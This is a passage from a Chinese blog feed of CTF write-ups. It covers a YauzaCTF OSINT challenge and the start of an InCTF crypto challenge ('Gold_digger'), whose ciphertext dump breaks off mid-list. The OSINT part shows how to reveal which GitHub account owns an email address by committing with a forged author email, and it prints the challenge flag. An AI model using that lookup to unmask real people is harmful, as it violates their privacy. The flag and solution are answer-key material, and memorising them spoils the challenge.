  <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">which_playlist_i_want_to_listen();</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>挺怪的，战斗民族喜欢看这些？宇航器挺帅的，Our Dream听着挺空灵的，我当bgm了</p>
<p><a href="https://chrome.google.com/webstore/detail/ycs-youtube-comment-searc/pmfhcilikeembgbiadjiojgfgcfbcoaa?hl=zh-CN">YCS插件</a>可以对YouTube的评论进行筛选，点save可以下载，可以用脚本去正则匹配你所想要的</p>
<p>但这位师傅上述操作无果，竟然想到在github上搜<code>which_playlist_i_want_to_listen</code>这个源代码里的函数名，而且确实有；<strong>注意，不是在搜索引擎里搜，而是在github内搜</strong>，学到了</p>
<p>是一模一样的源码<a href="https://github.com/znak-kachestva/sovietwave-player/blob/main/index.html">https://github.com/znak-kachestva/sovietwave-player/blob/main/index.html</a></p>
<p>而且可以看出主人的账号是在前不久刚创建的，与比赛的时间吻合，<code>CCCP</code>就是苏联，尝试搜索这位<code>znak-kachestva</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905212654561.png" alt="image-20210905212654561"></p>
<p>通过将用户名替换该网址的<github-username>可以搜索该用户在库中的一些操作</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://api.github.com/users/<span class="tag">&lt;<span class="name">github-username</span>&gt;</span>/events/public</span><br></pre></td></tr></table></figure>

<p>像这样，师傅说想拿来作为找邮箱的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905214749725.png" alt="image-20210905214749725"></p>
<p>然后显然这里并没有邮箱，因为github默认设置了隐私</p>
<p>然后这位师傅就很CTFer得想到第一题的邮箱可不可以拿来用</p>
<p>这里师傅演示了怎么用电子邮件发现GitHub帐户，这是他罗列的步奏</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905215434834.png" alt="image-20210905215434834"></p>
<p>我跟着操作了下，最近也在玩github，学点</p>
<p>在自己的github上创建一个库，名字随便取，文件随便加，复制这个的链接</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905232014165.png" alt="image-20210905232014165"></p>
<p>然后打开<code>Git Bash</code>，然后在cd到你合适的目录，clone下来刚才创立的远程库，随便加一个文件，我这里把Crypto题的一个脚本复制过去了，然后输入<code>git add *</code>添加文件，依照如下代码设置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;bar&quot; --author=&quot;foo &lt;tovarishch123@protonmail.com&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>最后输入<code>git push origin main</code>给push过去就好，如果push过程有问题可以参考<a href="https://www.cnblogs.com/steamed-twisted-roll/p/14155092.html">这篇博客</a></p>
<p>完成后可以看到，刚才头像的那个人竟然和我在共同编写这个库</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905233507116.png" alt="image-20210905233507116"></p>
<p>在<a href="https://github.com/4XWi11/email-guess/commit/a3bb75e9327f0728f0c25b81bb886aa6664b0383.patch">commit hash的.patch</a>里面可以看到，确实是该邮箱与那个github的账号相关联</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210905235538286.png" alt="image-20210905235538286"></p>
<p>最后说可以从API访问而不是使用电子邮件访问的GitHub SSH、PGP和GPG密钥</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210906000317896.png" alt="image-20210906000317896"></p>
<p>是在最后一个这里<a href="https://api.github.com/users/znak-kachestva/gpg_keys">https://api.github.com/users/znak-kachestva/gpg_keys</a>找到的</p>
<p>还有一个假的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210906101101627.png" alt="image-20210906101101627"></p>
<p>也可以直接访问这个网址直接获得干净的公钥<a href="https://github.com/znak-kachestva.gpg">https://github.com/znak-kachestva.gpg</a></p>
<p>最后根据题目意思，提交公钥的前42位就好了</p>
<p><code>YauzaCTF&#123;xo0EYSVYlQEEANaoJXa6DarxrVc8OWpexZxAq0z8a7&#125;</code></p>
<p>确实，正如师傅所有，OSINT方向对学习github的使用也很有帮助</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>CopperSmith</tag>
        <tag>OSINT</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>20210814 InCTF RACTF SSTFCrypto&amp;OSINT方向部分WP</title>
    <url>/posts/becd8ce9/</url>
    <content><![CDATA[<p>第一次玩社工题</p>
<span id="more"></span>

<h1 id="InCTF"><a href="#InCTF" class="headerlink" title="InCTF"></a>InCTF</h1><h2 id="Crypto-Gold-digger"><a href="#Crypto-Gold-digger" class="headerlink" title="Crypto-Gold_digger"></a>Crypto-Gold_digger</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg, N,x</span>):</span></span><br><span class="line">    msg, ciphertexts = <span class="built_in">bin</span>(bytes_to_long(msg))[<span class="number">2</span>:], []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            r = random.randint(<span class="number">1</span>, N)</span><br><span class="line">            <span class="keyword">if</span> gcd(r, N) == <span class="number">1</span>:</span><br><span class="line">                bin_r = <span class="built_in">bin</span>(r)[<span class="number">2</span>:]</span><br><span class="line">                c = (<span class="built_in">pow</span>(x, <span class="built_in">int</span>(bin_r + i, <span class="number">2</span>), N) * r ** <span class="number">2</span>) % N</span><br><span class="line">                ciphertexts.append(c)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> ciphertexts</span><br><span class="line"></span><br><span class="line">N = <span class="number">76412591878589062218268295214588155113848214591159651706606899098148826991765244918845852654692521227796262805383954625826786269714537214851151966113019</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">72734035256658283650328188108558881627733900313945552572062845397682235996608686482192322284661734065398540319882182671287066089407681557887237904496283</span></span><br><span class="line"></span><br><span class="line">flag = (encrypt(flag,N,x))</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;handout.txt&quot;</span>,<span class="string">&quot;w&quot;</span>).write(<span class="string">&quot;ct:&quot;</span>+<span class="built_in">str</span>(flag)+<span class="string">&quot;\n\nN:&quot;</span>+<span class="built_in">str</span>(N)+<span class="string">&quot;\n\nx:&quot;</span>+<span class="built_in">str</span>(x))</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ct = [3266754124418328672247866726679755848701520371443746634280907120024788951726790644565764235065010905480462052367779604906344974859812257431783971523801, 3910983850369346009480778834354740700744997092428714236904249742230620033736627429141128095231382899913639523058150705425021618891808444602545149939881, 27317810920765841342086929111042193579497353621610031484780035299001131982878467015665982909548553024787488715133220729973409548284520639203793990800234, 19049253826935282403928205549454387993361811589455900176398242634533643728656774386121481735599403129610194786842490901299693831767348811888295572944767, 46808271552976597930710682808639501725087745986478512439110229094106054260700609611651592136108105668095803793135384187386798141424456627246934054212204, 64663556663887876448521825389171681970226171803335047116994602631060184771208916838907061325157227065717836207677682181791737509930934478006410977305334, 71370989878902473729538075992611793835381097916199691855392840013136471258314666533631139620910819776545627240136734304044689167904095661008959427867080, 5120760109829368119622569216249179916662286493867330392301836160719483165296740657195693270825905530901001014831402378828989266553129276910799248011107, 25246762200155764725674915117428266946351252223920353292846537142043123004108726846560540427413694348662172063837532573805768559923596757914542578491702, 49840420035538562259818077270014233135437467586063205683943769627434293016547018393482060398482431118280370380641405128927430840198536985630649859298809, 84232356416028819831566679779591187299787046636995543449314912076840614265866721410586346948877186101748353344277333107087862936903079928428665929615, 56255989340747188472994001728565823905145449088080608312012473951209435572526372645545998691635581191431650844541918635345655144222239028951168850704422, 45785662740328453859890278502445450606890445328720454060032120470673511251330845850132591950890320517787732079986810994883608872640852386167756195212718, 54029870403864304285925769805259101311108719589466350768320792251083544066361265116520351278475192456130712826836166473186592532002794991923508524064620, 46624268375793936417415940726172495902868488296085533559474078710715899350421256180929703375516133001459740255662121433900562906914369420876721969039630, 15921219479965848802750013085928522470790034679969324752503581385316275799836521901155562358852385602763599760409651828923729107636248359311532535412386, 20190562475428250717792767608071965792428019405686414394515731600072635056217537304104019807474440130549050089029499956554142652193502911411782760901078, 41983059548033663270367946174234103357083211319135434721003248220792550449588248783877660929189053228157142988622736136441291989249080446689516065393435, 71609539411413240194556215042709157212260128588149087141493760115962392075268935955309314240733799741213805554924840687486128939284886391947755983910372, 48382284720865851648431016945797183660266155498343626372038256476287293528764330285514661435350058162782747986164808116116765643203666318480114386099343, 46730320638656612110889821918114226564809934661179594844549753878327086621670111917286750423548271235812428733761683357631975738361840732519608444014971, 55158112951581407023186496177304925445962183673199215662079568367093310059249411803313113095482726739394326470492736668839734286312650343715767983610363, 37112980203698874196497763225414417374526380133937967213841831269520374856619110460606542911440228172533968362786931746291414834514997777285267403140559, 63322083017732869600484256664107952565424442164218942893502809096945827312745918616246499734990787742358551946831008809185624657787375819807019566756170, 7131499419559104886376982790578102463139236264237964490683901837397932220525370218090186039561412497537162063460706345433646970829567561962759102801409, 58987942295441295007027662413419316243220623197071846210550338622495407069803847200822547917184493216087823262589570286179930999452321610193662415873715, 40463068017819882296397975257296430843199918804116579332129293544451758450871632123477648266871632208235745045407313414566869271527363707673269415792748, 63039255605860594706235701802182469722575918347437216391785141811844940190196047005143996180367679119101277408375635148536688180427946019402484987272510, 71847518795481381405870318786706930914683598350750876400219210332724219278096576686583523369096072741462359686018334607665415715621892012499046687826381, 26337284123753874828319186304791211620930566566120195495665155862853854859543475630545175774334287940418892288697324254994533678098095744373749417045163, 21764014175912521244824061176843027159941043924315159175826402721445924610127916171029483226782579782895796672888523861781938366363972830257845406910975, 3435623095726196844062581172306260159832381716480005885061523285318057788012070798019652466654719345533109449262217283547667486720590207050726788521007, 45919770921828919777762020824998206274312663582623531457423945627938988437572523960733207639926323480092557203738058449123337560810938710160906364447620, 10316176533060759533513950331093265748621797961634020464599935470363429799039909475463319253036787910300618231860969786155510737831206632050394210070451, 59917326034119369331371808884574791893663783551610720886605582940613080599142224466706727532690507606452696459627055492221262118596727675146540248450673, 10842419169283306075038519352806019318831568946592817182841197553628341894023325198625377701960932683672886924641591814480224960323114162850149838499007, 66742064034192815235690238007451310177229882619802417230057418182591053854863990729434269230203542276063435489487230228617313299686445072114861937495520, 17337799506489098810311640536792733150718613880893950634528762031894931254405830986337609675999763577152750890798518494436701133617817677416137197595268, 11805355039774973413960279981353089487026545524788641978782960297317350024970913592970423213016483957303390870999692309756230863161264738948268751555880, 59489883634739735974968870045855217812381229180244297407474712914329781106395937678986012546789197922278383445284656100208400201934959073937202913889830, 11401451000912707217036107785027425488005850574045702577420854119932133317734234141433888477046072783546143158822115361906593423801947424855735138806051, 18179963830269752328347012892189518105760526272986096873166870569368065912159690171168153334762363786860481716195666269739056960619187285110236225225886, 62509640700826594197993512978970850974297618960597709071687370554258739737985841220615247665877415157805625480566585584212254522216095818226299866458643, 5990222180228599266357925284831684381480268959200508566159335502046629155561009569578204543747284027605121962752167560001557422741943001415508677363231, 33433077637882273687249451259081443266379398604904264246156118486060075935455701873884654140790578203732502170849912443469942139967789200144428417241869, 67390195969105286284597473259273322568348281288068806381991832178917414558751508417404533918515282632113916633995251246834970162639704436292989924347318, 51701910800009973400544456943096381774979876707129028438769990843089912852448841473885556005345531439548870638966325407697691571465101340746897457585835, 64048417355580136172437626164825086735195128281991270452716237192859126404734412422587916788587067007095933362505117338589065656344579539799999449469574, 11024312233820256409788185405651410973909901139662527410532287633062222198961951836395718214894529860296406012036221609952405828243329490439564855935053, 45329081591634176909575079913822799290480598748734762443445536547105615371937523789002728790051543635047627596020113965500849934460327043133518899375170, 50858826475819728877134521770119997192668235111631842299351867815878082946160808043722869955055965555491424602575020061945411539811210145167251037970092, 35605374328853657972896594891951135620842006755668179374120075488686032129628717565054614577034983995013621326992214854694654154462512740843488210469396, 31170348521031754418118681749590239915934031936796619456246634052178959509402331720360681877547395350885325824851456359846571423553040992405912065457755, 59235278298913032815919203840415209842948518118915680147287275616028831011314878653857791522574491917033065613888064574586219759420566309846454002915944, 55319991676617828235828390538945693681702722602937980374183338775928431972606168528372504847459436496193456215997930129475890947660295696626996070685399, 7946870457459059970109585629186928476241935128637094143300110711234966048431895814853588251934003626794436938278721281017542468015907670659174126094588, 60110891503272403664065394170003816011867116599893134107795360372565178776851374128429405006507718785684697472100752699732488483946804818800187786578649, 28279251639525643355877411167790163315397766491944901475131371705035937611147913823680263340304888492788066877865697182783730607520500342177273147964465, 6673833370069672035529220709936517797053812916528936873626422295997956892073437608466673345610466591708954318522770521974566575022354974853539867139350, 5879041803124517031806630247719802188447725120442888110855907546956543471854281435506980968790820321124201724811614798792144878116655764899307623320136, 46864340634794085287213925222361157745729562024150128352765398567593088408221097741325336534579587914360401522890993826689469607826752680659459769771431, 8194451314034121623645292874953043868906899758451558731238739345182971126911643030327002247089719765234796367899874722374131450517330794969184864265713, 54446936497825800023536609025402128927467216919569806105966992425350211112265310321871365273194069612198965714146835792444278709366308142096412297265032, 49664620584746459632512586261608724278384529510561086522888627087059419641518391472859742516411690833878920555447289023607513439888401052315872395574373, 34156898638495828862328276933343254635452063265485210177467337609797392315838078769011438130125084767966982454733534259502040326632050149471710348508666, 30492198670321094942861049272814891796315708599800847931912081071102611152253093617978259071301664216033027428630697510455458584066407898917345416941984, 3613793784149192211009755488607428877163935560348733114269389687951497165685491322762261041825459125734297171440959408110806113464512878353595621354124, 12279705763694970673180436576088750272877526458037348371251591370848320075305832402846262804422841673867165174198233855848053055868119847638872372525395, 40877345239599080056832127332813108739794170402420519232059882581963379407650348756595927322565602511487901201482080745481960512748979230428566291962209, 50546970004760152402741173485014399024368459266914425153586817660910717388484363246842197469386308850948569760187130921902062389896918698251273033571856, 64662267274327121405145824520139519983970096850456319521102019795323464547250680114959766238015838060324781632896477707391370458399641977648129612809038, 74823756640316025618954831379580570287967795410041950245729147391511040327761948655357633338389729152644316098558070852276949927895715141311841068142683, 762075440208372468457962518481032774485090765040784352734612009016363153625431711847941729511572440976615875367460547015734181996995485157260725662952, 64718051366850823837872791256009130717247018020738367732669264535095514823570679009829052437291714822262216686090867379415239832447699096227625953654575, 14328318579478329070293281000390592890070295919392789967087225586048036901970102398921920034252680786983029475504846324077453670966766712985708086115150, 47819508550033678412702853706889631101410669749660665471143943281512698676783617665357189652026699097954120882414001154717918997258089353475775017452185, 5917167011870468624934459756466041916210766501691207791054221150438479042997857395302149649641551035080177809428783031566380296513853795548449641628586, 41372363122583466455014083650227416026095961915774665002591710993359438876577512822289349596872352743367616920266534220322805021770081399906934762996032, 28647102763694202026999877209365618843600517790276376715320831598625371231696971200891830639779198173374611170197106904989505701448484935534416324731169, 53461351058252039600406409020962287941814731855470754786484336480708351831993692806078731253573365307629429835558250376047395072489343618190215178696516, 43211630519982808255325055496431416562222405741391065144006747207494590517094963089326646224294212750016402493438856500908215224317253710640894768430281, 8489708911460505185941816612455271338936811013379084567101550260456573945478649038478506124294118197300669469552705017177655827270944844418578645699152, 22739718474207416860681516907108136245175908110579776599221423813780736521274509818317809641049136756126199753989311235943226623196775082849059257738072, 41216499670212294334651280812035668747548709105131700794545752519540336375321441907637985149672677540242864272713496740582094257029359109571709000713825, 48436506165397582669698530270507359120085582624990229731099970062649834008095239898512290025067179859801307370381405935208194802989995664780696159389689, 1585369946799131155304166792386457012394172770118639384910000681642835771323532468563585207012194611439135457247277948695062359471337941009175179750235, 8603288144119666511944003354168237303458523480925560370062388564635953061635422717389647940009966345557089758149833309897265764908036946377403726618906, 64101222620087611592309324709486851372656586138648891623135538258769906088025167941884507437869898345591373545551263183771852460865686465909022927922823, 16527144583489800339074589267622703740391892670414596775572362839811603852353263595287933280097926247287643050855717192439454800012237185587025342258030, 43667276680817082856834267636292121806981833777605458119209912299727781374012735950942847681976014650650405115417073655652257330450319405915928655376177, 39140951449701344166515688244374428886790877436502233180291072955127927101012734150869177569984136037272345222078216497684424410082172979920851697773975, 15537931042700254522587611176252004453412359577558220416074867095513378168984740154709389168969110367119587635943911825884344749910502795904913565227171, 57584115592473254303228454322525041631785171154103151093178874729079883455704358742586133432524956311883692239859557427834314150568077783639133527406561, 15902237980034809502971143965910358380816080400139184729125764474998259483264801894369466939263995676073257771273315544988512081225248999046822890564977, 50859432507876871258927044776148363731406483617554361871324332579365392377864999224029880363976243413656509052039814721618557677796897407829481142501716, 50060798173579642460106276365259395020688179551858830324826993612669623395929348865201104783185027263959131007321716038538876728815916511632533475508787, 21093401456079234258633171367778610446554117298173713744762450971193474816596635169881513417411413038931760122717931556008404922107697781138738323563002, 50871264470134644149642093828613407668761384164010018255643103521706312798607261474006789318936113229951254769246573651604524869541390940231104684687828, 65838555702814180296502565256444943340789146155658490130335701086297475619402177576374380169326664726736494368635345919297077269982160643735772030139293, 24183722911773924891963995001641331599594300538730494876239125258440555112551130346374041352293686484865295711516004079542559716598370506355252388731350, 70606983798229863770250838918961585630206515326394820998515905465501611723197873446221977733861919908305182573091789028866133518127760978086624785572904, 11574928020551879788627561129470863705564562907388661456838163800143145198992173457723644287037869966419076396134774957477432556478226898353190935778723, 61029601692381479053663587491935218989230811632558264300601308877354851284048932424730379285115898154959889378242675070408077916548569590745161494020674, 34604770125285800302365085079448294275594244440799617063053747652130859109690225689984871840665734961588683955127558201536801499336385265078556174141724, 11825597588617747085813837160017740648061802450778741359221519197975620769557373411105506691743139890711450252799721855339832409870791189985511619821148, 34221142804688884612787234476210488966584817478740599608446861479556501184308249517667796316433825013495886774426619501938042883318353949169073622932744, 18626654830829475933724422229531521260247749630282640788454897823986815196267646960322528599768563257608682140163517447300417938175281593596472310333259, 15709074995155666536793599438372653599673735072188045774362669512451580013591611414407383605083544686738323270765329148547175040050934619370240766488333, 1807120755932854104162772993352975977760368638030857510642192355770896237772277641435107116319434482498433810059226241520094868716474796133993906931214, 37175875591621937319620824075660098532446211618393274891254086565846020184454461310691428746518208846269028512685632952791283499316042277840066268195129, 14652938444415650146108426727368774911315569390356725236669074038662370902353854430602299285995671388121797270924184989138832895927715432624521826601309, 47503054411496613094174186159972883477343149161393992519368436992417560814175528597285395254700710111273038321292730265852161368920471476449693712252218, 34793266164410375187844704085373206595298873402664366666028335804777378715412285901615379046498740410095606705388808078973507358398160040266718217946420, 235777724023845578015968861685977896665545490030219293563237196041336651532625951991560690649655213041706956579810596768294392894560876103128919580119, 71699058026409903383591705758367140642656320715564592776562414985231704111130111268636522681868943716260492033121836183918600499109157978582867307435478, 5937340281741409173867715448617422850056083505252299835611627207868477902961686067795913449403704616805095770356914061148217655631521545003566311163286, 64970050684346645753410765937802248505636168494626578887182023273794960033653433460563394458144307982586048416865603229619651223215132716189029755965020, 28870151994623151917023631120163925496751172862446820796983669340074436826020543852010174031614232391623084724927387919132365749617232754179670252501288, 69316076200432522853422621078078479151899079890475362712069060151657101527879255706785128065088204453815353722430442067537036693490873329815183509775, 3656051605191401898523989951955450249753486544663894178988712577274662300636794652573077192350683038887211374712971200623563954853720538374525587861947, 59586376996345945899321257213258255736309213120802065827823301801096000077211540336197804819829222638564990740367120689915041923060818536969845303336048, 15209485646348568900613966175730263254996829574333766936919924747188067731995601898247851968054973155712860201835166302413341122127777858826564815332009, 65755944655354291863629481839344898125814080585489634477140449461486313994489712061017959934634948723074739252828514224659794230711270273986941151181246, 50044404782587975442358611321418585899140310908021360331315863141057616552340669011243801143395299815080254884794259990877619054315600014568718678262588, 18558186313286434827342393130857688381981240522540569652973740316924906520700554828290216461503534361328921396613229114436061029645283726932096210928365, 68121379646664377662543670223776546293099986219464564654888075357435343435295885243745380118444351548491552692045476944398276755320279785851733710778053, 69676172471015297584764278648519463973205605601973973954462659583351488700599697084095357354579852852975382605861180382202167440159214607938057506594888, 39868944884482077091789165603089328814636077812394209556130445270433071989411476864469152420597572325645830729366730705237597203343357461240500600362535, 23984225124526499163679989394300108542505969311640364168939273256169801709960904670771326948340213899233512604169808182913494660805720194941581797486789, 35140762457338703522439666809223184036794921565129617900381351263704514634805278362132497435138148263120289598367498165241519353320876411527172006380453, 24710691291453760841127687544504422972359827070499809049833293022746980471322200519845199709962567026745924106667690801956717451739332740526036551644785, 42582526200077717150143034364406179825370961007062721122124035466123261273825712581697916024437162094418224246572238536860392260236391392047271653531524, 67857483194339954482708519285879971058057170331448036301958621715916752108065210839856796360751666320642447394109637904785042539162094111072802047335497, 2599658436887948510146428121143122270311474436315255066097573906424588555325614896291500818473644752988078154748378704726917749596783076943413881775398, 62417511462783839398179767060659880783567096687315782396857233019238764137474740645399882358829642616473826449427654813700282313879746864145085481696994, 25046815174632206886915532324638612752235046746052396556181373371408959007980374964947016992667728355879280189035456444140202956919168084330921175866799, 26746087245003271019093242066186960118445359886088854449367123073505725700064370270771541201830383789978922299669035082389492227282511856195439127986603, 12899941330821578969367955126377518942374396461212099980148272913670808413456822700739908200534046934604705454192034690229329311450091796802978183417118, 34759455078337466713687570837759299391145888134102277551962358024620758688171187801911667844577854548914263100454305449832301751244677050808326765573935, 62641568509833713711570997042380165235664835417880047834887119941106533946838625165485309542062874513558580937837811401775554996056276012858548810747347, 54194019664134441577306366078821449269779438459243001896266057182634402737447514629588811251761251129611153860195003472642962987782051611103708961485272, 9676719975605727589576567594806284175654511463346916758560517020880951689432081269100395625675818196925127997734215947176763303327133107063728652865092, 63566749489727772620392173241354690191479996208515013140899609482323018089891274628587945348053732850402777375616488219134732475021167536614183749124234, 41389623900588800459370336537971008333777146975023702675438708757749752963555785484099714125932669585301871871129676831310055260650788211828337348491635, 47917075128910721336524911506477538308166963835676033239879005679388922099453013708492602384789333571083037290234698623216184215279113464823730289467631, 42078396965923796292197567173986146390599180034726305403980989544300924488594853500670135297251227759567949453084387623824589172575028323672347374791941, 26303467325603478409681425746270561760458104487375750208136288587139525406524153947947748518132616711483856699835473508339705278736292600540239815382909, 70210903943912719585335197681971161149552376713285943471513533016171830587948389001752097220135466501852133147457131249134740746493652843424857558685008, 10982176703594503335099043190281003439554172817765519010960096427582643358491587999013894116717272583614348843361339369352126040302498012513340173620179, 15375296014322542477512079793365451835294548632729239177298243608312496055206983209051785207816356014706827464682118103802848458765231022530576526601610, 60741281657044949725279101097916718408759978002888427225701082044375050708404243485772424286061753927582296860956198565404203687044663002010199141883054, 51453860908549486935732242355904656953839434743576398315040968465095709554302378990788844834564479090576226704624193613651209306174501876260882175512600, 42121429843235634165003593566253812713226165431603117921955402685633741429269868521680013286432815656510584597940543612666107258425775935790786790012041, 75847336522995708598859507481988194486014177305660997189842728336432951513069707589487951184161881119260090343324285618931758405413108075158339567925903, 65758341817222621457885108916596158755098306658220921631792142654742204146490776266664280599781759820995333825069037428985525987702654906233411792587673, 15752213867601716547875293001866113163887582411052023985266075351056384315464535935735251239301973973233286836062255507777260674731895530600057333994665, 11151506009425616448244747739591250923500688700709156802826028410961247750111513167162557346776825044249732147604063296508981593009108961067551626395468, 24988307810903416422223700059042860807188507865378899213217629974481150832035797596850622418574087799771865200841087717335083639492611011968919584986991, 19188983999068145211485730840887302107035995560988908325822555747788727142296909943420991730736407232657762626482614632643567904876131676294106469080567, 49165807149291610078767263213011932229369890095374948339130583996779251886618924483782989424700910216292003196618943704463960760836284727712556416138720, 20880120825314766313470865125308572795577662008420147141189550790502101907656949439065273036601014525812307321695409142098153427350456159779924065995426, 3134148277638552172931615388909963243267631440500151801678408733633678460466625580372490623855596910321277808417815986593695645228186837564359773545208, 76027513376813747014021359611570577983815818102025816667258692296115385413227296619875774704856616068742697489757991264586446726640812185996619526500868, 9576386300219383458921907336704987148002255976652861754527672989041213499573772344464927344170160854134801169030299424714027104595802440175290118115467, 47846312343889535970416011840273559470023183338680746515101124658408961305018438134079804670804491884363672682872663103910308908246260073683029778116394, 16836020225895041283399865570278952563361372411312099179664436864693089583825672663104654006872379721154178277022850302378558639898531813871944866012688, 29312555443866353115375285797020858933593819317714753848974053207751144798790489316607442702651597786670972424273015577465723971183954317290632255518341, 45952399494660064838144555112298851928990690958591804048587523480566851679383669387866668507436863822348953169424458480096739821837326801953301622926562, 68334876517321835871217564446395717515355168304996149895652706727069147165281984411219162106481594608000995755151779899698717529318256390790021401438718, 25861029641666972527634309013968274542799402009868571607186682711883347548473260695668831750252078832274943353602464264720165568888925706728574087342628, 68551775088688184199771942195355426911668032674229430062997403726538379537067490978577329178497921291686561217843648566010918593439905810598612318905217, 37765025505682583464362211182398757603423382509025947521873112343726694702300573134890794527289002851767037029190171815999811136695377397688834815605025, 4249505767147772196031020651289585799937480050894276528897542147646240685440344617119239879135528543262687454500110733454342336571756916026373576137223, 12211897746552190684252135375038193571224731278828097646293011671737319460987527595630272305866452394238518927533887961137804982383129793243658322073814, 63672159925831702084608593770871378832840634765254242580922793878262780657303215300065343199745082617326364301567988188247544290658412323708309128521112, 5916152400097580259043801191542869219461022009826571612531294723654814844742388313101200734677007620911765056890963706507708736854388938954261090636816, 14317119988771636810566962078982667504680472212731015560163258949791136175315507709882234357375608038567842467558284485862323906865760782946330956519430, 73425426498763600363398477632846027187594993874507584521147927260063731277446622859480454490655597092173511066199697647323557539421105251159917461116448, 51291671008697812263954316353958818245358049801515013402923829127778604245127923912127853869137576703271789663513404617700625997281587078815337810294446, 16764552517838375964591874922821157969132749425046056275194064910709033826102499972685485237677710147299249213993545772193666719202717777304436525138230, 59295557012652744772208090497926508763666861380190571969243245501411454118387516963262188176132218639685609791422928694949362661989298405412386894959364, 65680239245306856298345111605806359497039862013602921288801762280364506136494777241063396949184533793043022857539147614816975238609243733604742559030417, 72375457889148576789811045675763717743813326782917792391377546702617598519587357238716263943784839291085690192526337648486979325162244907674119290503179, 53234077992007207968984629907955923807193864660771571665077871505422718966065301015318200429417886713035533081206849701294144524970607157018727881011421, 15886483931792974203050424700896494469022632750392566017940896092113020011301447115452279047200702841646809408874121286006915340993084644941811925011891, 4000026211601185502106663641762011708725430703734671920980073131891918285295081752549137630953921078183393375323131848411438504218653510143085517924354, 10319649624556731904039447425825069667183347360430256330142417710766254562223686734071109743956144803418154942873286729125709953817180715625501589162545, 2959127299070091142116584970101314098498259209023373122113534164489561723834616597754357457826712259811824721968019042637401460259286073863020743546081, 26966963187874068549615333973802158799875048269647561639319582873986161093336638373947258726531714616272425009280351155372607494769526061426271185799776, 60480379686940304504344210934804247883844503527104600258142856523953218645216216990403655911740533083627163777976245336274909972984546880202034729883312, 27261558287522575971851824442111090365144022873658966480485633047176320843612473205407488091205599851003730101551213929420057107039313052216522197198978, 5924889509968412055641812913053199966953595678605910723404383140816995621145232830288766243387119999521206867701900470658723204158233731531189957564758, 23453156796655450247116141307366623758418077565767073760208454382429546186654265548677867775354067560840816391896631759441083435660495001159025898492686, 76150503404358535746322203310861113340536545623277464771697476586798690077324876584398928162593218798780607052161166996099801460843556940059525992786824, 37727315876172847591393275092226735197131216415762771377741373327831827247473435512306043337156965991700136410696885151255831157825105690279082625332709, 34063446655575684287153287784734254171212485972386063875998727605151998698499957152558118780955043931859154057516779473847326673786233294077986859617690, 47483470590782205333078496439458525138609729122382072733999354756246820163015660201372672052476227811848001151006206216443241731573155888424535367176708, 39218420907233152349337503997750016372701524044569318259499048063748671531881474959351678569430809988119317210858114117053551093965393011243381378492998, 346813155305357896000101560296376715878805746572198412084124073507251650659757384260350199082220679479346402180280656007677537505603012072956567379200, 45220337350144137249456097166594787592336841735274298685371711994002352406886579127021444669722143416211134915968064654027096905338300592093107053708512, 5460012104494377033762803353668672910910932872167923235617032840897986334654385783555614999313086224242950388742840844011136027857375260879396677603020, 37023646144423321174994717117908019318650072460288262938875273128986672114185107589432972031304290211565654988060691997961153590815964538144365251181775, 63177477223445910049201384279690078930019819284264306067500875252847796215965700799007341759196250450491593055470958720571995993265879745352512656382848, 1700583012951649590611729034981286100342721588558142880964582566799910787514220066268682066981428229558226944161013518056229007812176089692828860741392, 17246038765173067313249878215359330957527587326662502645985291635246053470015915728537330740772303686721906455426913214534530261079901607192934039938060, 45987434147399996197496782026993298557958954570476732783848760609793549635871429620277069591160239426699116842877955529435739418658862835669098411826316, 21111490547303152987944854108036303223281643522396150653972569704379156697301910516727830184770144662770080107913540137717531007645289253745952440414926, 10698232879034106801260353759116257884533008949848502754162380992641437894367605208136298588395112435423177990947470598835570681171317007264887720823778, 54293643078851172364687836934990821579687484157127703064858191752204436487026179374856533544917557799042002597904530828982489891703237561281336459590518, 47797005580077273834483109591754793806985949961317398846769483505668568755603394284565164912646840149645763801903493468755606222509979288885436039797214, 37386506628153260384840150994124701181836200890809074083427785298815850467904026208990622829408207112968603273995655647351172691130659109869622941513399, 